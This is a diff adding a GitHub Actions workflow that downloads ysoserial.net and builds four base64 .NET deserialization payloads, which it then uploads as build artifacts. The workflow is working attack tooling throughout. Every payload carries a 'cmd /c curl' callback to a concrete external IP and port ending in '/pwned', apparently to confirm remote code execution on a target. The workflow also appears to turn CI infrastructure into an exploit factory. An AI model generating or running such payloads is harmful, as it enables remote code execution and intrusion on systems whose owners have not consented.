@@ -1,0 +1,43 @@
+name: Generate fixed XAML payloads
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Download ysoserial.net
+        run: |
+          $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
+          Invoke-WebRequest $url -OutFile ysoserial.zip
+          Expand-Archive ysoserial.zip -DestinationPath yso
+      - name: Generate payloads
+        run: |
+          $exe = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1
+          $ip = "167.172.142.69"
+          $port = "8080"
+
+          # DataSet with proper cmd execution
+          & $exe.FullName -g DataSet -f BinaryFormatter `
+            -c "cmd /c curl http://${ip}:${port}/pwned" `
+            -o base64 | Out-File payload_dataset2.b64 -Encoding ascii
+
+          # ObjectDataProvider - WebClient DownloadString
+          & $exe.FullName -g ObjectDataProvider -f BinaryFormatter `
+            -c "cmd /c curl http://${ip}:${port}/pwned" `
+            -o base64 | Out-File payload_odp2.b64 -Encoding ascii
+
+          # TypeConfuseDelegate - classic
+          & $exe.FullName -g TypeConfuseDelegate -f BinaryFormatter `
+            -c "cmd /c curl http://${ip}:${port}/pwned" `
+            -o base64 | Out-File payload_tcd2.b64 -Encoding ascii
+
+          # WindowsClaimsIdentity
+          & $exe.FullName -g WindowsClaimsIdentity -f BinaryFormatter `
+            -c "cmd /c curl http://${ip}:${port}/pwned" `
+            -o base64 | Out-File payload_wci2.b64 -Encoding ascii
+
+          dir *.b64 | Select Name,Length
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: xaml-payloads2
+          path: "*.b64"
